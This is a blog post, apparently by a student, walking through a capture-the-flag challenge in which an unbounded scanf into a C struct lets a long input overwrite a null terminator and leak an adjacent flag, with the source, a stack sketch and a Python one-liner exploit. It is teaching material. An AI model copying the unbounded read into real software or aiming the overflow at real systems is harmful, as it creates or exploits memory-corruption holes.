---
layout: post
title:  "Explaining Basic Memory Corruption with guesslength"
date:   2016-10-11 10:53:00 -0400
categories: jekyll update post
---

<i>Updated to fix error and provide clarification.</i>

<p>Quite recently I've noticed that some of my close peers aren't too familiar with how memory is usually laid out in processes we write code to build. The technologies they've used up to this point have mostly been devoid of memory management, and so with this post I might manage to provide an additional reference for them (while trying out Jekyll).</p>

<p>To be clear, what I refer to in this post will be my experience thus far in reading/writing C code for the <span title="the architecture most of our non-ARM machines run on">x86/64 architecture</span>, and may not be directly applicable to the course material we're learning, but ought to be helpful.</p>

<h2>guesslength</h2>

<p>I like the idea of capture-the-flag programs, the kind where you can be given vulnerable programs to write exploits against for competition against other hackers. About a month ago I had participated in an online CTF in which <i>guesslength</i> was a challenge. The prompt for it went like so:</p>

{% highlight text %}
I have this binary, and I think it has a flag inside. Can you help me out?

p.s. I think the program is completely unrelated to the actual flag.

nc problems.ctfx.io 1338
{% endhighlight %}

This challenge also came with some source code, making things much more straightforward. The implication here, for the uninitiated, is that this source was used to compile the program hooked to the problems.ctfx.io server on port 1338.

{% highlight C %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
	char input[50];
	int length;
	char flag[50];
} data;

int main()
{
	setbuf(stdout, NULL);
	data d;

	strncpy(d.flag, "REDACTED", sizeof(d.flag));
	
	printf("Enter your text: ");
	scanf("%s", d.input);
	
	printf("Guess the length of this text: ");
	scanf("%d", &d.length);
	
	if (strlen(d.input) == d.length) {
		printf("You guessed the length correctly. Great job!\n");
	} else {
		printf("The actual length of '%s' is %ld, not %d. Sorry :(\n", d.input, strlen(d.input), d.length);
	}
	
	return 0;
}

{% endhighlight %} 

I've stressed a few times now to my fellows that tracing a program's execution and understanding what happens along each part of the way can be real helpful when writing/debugging code. Doing that here would reveal where the application is vulnerable.

With the call to setbuf(), I assume the author removed line-buffering for printing to the terminal. Not very interesting. 

After that, they build a structure containing two 50-length character buffers meant to hold strings, with an integer variable between them. In conventional C, strings are written and compiled as null-terminated arrays, meaning they're characters gathered right next to each other in memory, with a byte holding the value of 0 denoting where it ends. Can probably imagine it like...

{% highlight C %}
char s[] = "hello";
{% endhighlight %}

meaning...

{% highlight C %}
 |0x68 = 'h'|0x65 = 'e'|0x6c = 'l' |0x6c = 'l' | 0x6f = o |0x00 = NULL| other data... |
{% endhighlight %}

If that null byte is removed, the string could potentially never end as far as your program is concerned, and functions that read strings will only stop when they find a null byte. C programming can be unsafe like that if you don't take precaution, allowing us in this case to leak data.

In x86 processes, there's a hardware stack built upon and popped from during runtime that holds our non-static variables. Typically the variables in your C program occupy that space from low-to-high, in first-to-last order. This means that the way the data struct was built would have our input string lowest in memory, our int length right above it, and our flag right above both of them. 

		base - [base of the stack, some value high in the address space]
		base-0x32: [50 chars pushed on stack for flag]
		base-0x36: [int variable, probably 4 bytes long in 32-bit proccess]
		base-0x68: [50 chars for our input]
		
		<span size="8pt">Notice that this stack may look upside down. The base starts high and the top grows into lower addresses spaces..</span> 
		
It just so happens that strings are read from low to high in memory as well, which means that if scanf were provided a long enough string, it would copy the input we provide through the space of input[], through int length, and even flag[] (but we don't wanna damage what we aim to steal). 

<h2>Exploitation</h2>

Our buffer input has 50 characters worth of space, and our number int would usually have 4. To fill this space then, we could fill it with 50-53 bytes of junk, so that we can wipe out the null byte when we fill in the space for the number.

Note we should not that we print out the whole space and our flag post-exploitation by guessing wrong. Irony. 

Anyways, I like to use Python for this kind of thing to save on the tedium, but anyone could feed in the data anyway they'd like. If I compile this source and use Python's print to exploit it, I have...

{% highlight BASH %}

$ python -c "print 'a'*52; print '22222222222222222'" | ./guesslength
Enter your text: Guess the length of this text: The actual length of 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���MREDACTED' is 64, not 1303176078. Sorry :(

{% endhighlight %}

When ran against the server with nc, it worked without a hitch, and printed out the flag: ctf(hiding_behind_a_null_overwrite)

Note that this kind of vulnerability to buffer overflow in C programs can not only reveal information, but allow for the redirection of the program's code flow. This however can be saved for another post.

[jekyll-docs]: http://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
